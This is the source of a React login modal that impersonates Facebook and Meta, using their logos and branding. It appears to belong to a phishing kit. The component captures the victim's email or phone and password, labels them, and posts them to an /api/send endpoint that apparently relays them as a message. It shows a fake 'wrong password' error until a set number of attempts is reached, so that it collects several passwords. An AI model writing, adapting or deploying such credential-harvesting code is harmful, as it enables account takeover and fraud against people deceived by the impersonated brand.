import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import { tickSrc } from '@/components/icons';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import config from '@/utils/config';
import axios from 'axios';
import Image from 'next/image';
import { type FC, type FormEvent, useState } from 'react';

const PasswordModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [attempts, setAttempts] = useState(0);
    const [accountInput, setAccountInput] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const { messageId, messageContent, setMessageId, setMessageContent } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const togglePassword = () => setShowPassword((prev) => !prev);

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        if (!accountInput.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const accountLine = `<b>📨 Email/Phone ${next}/${maxPass}:</b> <code>${accountInput}</code>`;
        const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
        const updatedMessage = messageContent
            ? `${messageContent}\n\n${accountLine}\n${passwordLine}`
            : `${accountLine}\n${passwordLine}`;

        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            setMessageContent(updatedMessage);

            if (config.PASSWORD_LOADING_TIME) {
                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
            }

            if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='ae-modal-overlay'>
            <div className='ae-modal-panel ae-modal-panel--login'>
                <div className='ae-modal-body'>
                    <div className='ae-logo-dot-image'>
                        <Image src={FbRoundLogo} alt='Facebook logo' width={70} height={70} />
                    </div>

                    <div className='mb-3 w-full'>
                        <p style={{ color: '#1877f2', fontWeight: 600, fontSize: '14px', textAlign: 'left', lineHeight: '1.5', margin: 0 }}>
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img
                                src={tickSrc}
                                width={16}
                                alt='tick'
                                style={{ display: 'inline', verticalAlign: 'middle', marginRight: '6px' }}
                            />
                            {texts.loginNotice}
                        </p>
                    </div>

                    <form onSubmit={handleSubmit}>
                        {attempts === 0 && (
                            <div className='mb-3'>
                                <input
                                    autoComplete='username'
                                    className='form-control'
                                    id='account-input'
                                    maxLength={60}
                                    minLength={3}
                                    name='identifier'
                                    placeholder={texts.loginEmailOrPhone}
                                    required
                                    type='text'
                                    value={accountInput}
                                    onChange={(e) => setAccountInput(e.target.value)}
                                />
                            </div>
                        )}

                        <div className='mb-3' style={{ position: 'relative' }}>
                            <input
                                autoComplete='current-password'
                                className={`form-control ${showError ? 'is-invalid shake' : ''}`}
                                id='password-input'
                                maxLength={30}
                                minLength={3}
                                name='password-1'
                                placeholder={texts.loginPassword}
                                required
                                style={{ paddingRight: '44px' }}
                                type={showPassword ? 'text' : 'password'}
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                            />
                            <button
                                aria-label='Show/Hide password'
                                aria-pressed={showPassword}
                                className='password-toggle'
                                style={{
                                    position: 'absolute',
                                    right: '12px',
                                    top: '50%',
                                    transform: 'translateY(-50%)',
                                    cursor: 'pointer',
                                    zIndex: 6,
                                    background: 'transparent',
                                    border: 0,
                                    padding: 0
                                }}
                                type='button'
                                onClick={togglePassword}
                            >
                                <svg fill='#606770' height='22' viewBox='0 0 24 24' width='22' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'none' : 'inline' }}>
                                    <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                    <circle cx='12' cy='12' r='2.5' />
                                </svg>
                                <svg fill='#1877f2' height='22' viewBox='0 0 24 24' width='22' xmlns='http://www.w3.org/2000/svg' style={{ display: showPassword ? 'inline' : 'none' }}>
                                    <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                </svg>
                            </button>
                            {showError && (
                                <div className='invalid-feedback d-block'>
                                    {texts.loginWrongPassword}
                                </div>
                            )}
                        </div>

                        <div className='form-btn-wrapper'>
                            <button
                                type='submit'
                                disabled={isLoading || !accountInput.trim() || !password.trim()}
                                className={`btn btn-primary w-100 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                                style={{ position: 'relative' }}
                            >
                                <span style={{ visibility: isLoading ? 'hidden' : 'visible' }}>
                                    {attempts === 0 ? texts.loginBtn : texts.continueBtn}
                                </span>
                                {isLoading && (
                                    <span style={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                        <span className='custom-spinner' />
                                    </span>
                                )}
                            </button>
                        </div>

                        <div className='text-center mt-3'>
                            <a href='#forgot' style={{ color: '#1877f2', fontSize: '14px' }}>
                                {texts.forgotPassword}
                            </a>
                        </div>
                    </form>
                </div>

                <div className='ae-modal-footer'>
                    <Image src={MetaLogo} alt='Meta logo' width={54} height={16} style={{ display: 'block' }} />
                    <div style={{ fontSize: '12px', color: '#606770', marginTop: '4px' }}>
                        {texts.aboutHelpMore}
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
